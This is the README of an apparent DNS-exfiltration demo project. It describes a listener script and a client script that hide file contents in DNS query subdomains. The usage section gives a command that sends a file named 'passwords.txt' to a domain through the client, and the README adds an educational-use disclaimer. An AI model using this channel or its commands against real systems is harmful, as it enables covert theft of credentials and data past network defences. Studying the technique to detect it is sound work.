## DNS-Exfiltration

### Overview

This project contains two scripts: `server.py` and `client.py`. These scripts are used to demonstrate DNS exfiltration, where data is covertly sent from a client to a server using DNS queries.

### server.py

The `server.py` script sets up a DNS server that listens for DNS queries. It extracts data from the subdomain of incoming DNS queries, decodes it, and saves it to a specified file.

### client.py

The `client.py` script is used to send data to the DNS server by encoding the data in the subdomain of DNS queries. 

### Prerequisites

- Python 3.x
- dnslib
- colorama

You can install the required Python packages using pip:

### Usage

#### Running the DNS Server

1. Run the `server.py` script with the `-o` or `--output` option to specify the output file where the exfiltrated data will be saved.

```sh
python3 ./server.py -o output.txt
```

The server will start listening on port 5053 for incoming DNS queries.

#### Running the DNS Client

1. Use the `client.py` script to send data to the DNS server. This script will encode the data and send it in the subdomain of DNS queries to the server.

Here's an example of how to run the client script:

```sh
python3 ./client.py -d "google.com" -f "passwords.txt"
```

In this example, `google.com` is the domain to which the DNS queries will be sent, and `passwords` is the file containing the data to be exfiltrated.

### Note

This project is for educational purposes only. Unauthorized data exfiltration is illegal and unethical. Always obtain proper authorization before testing any security mechanism.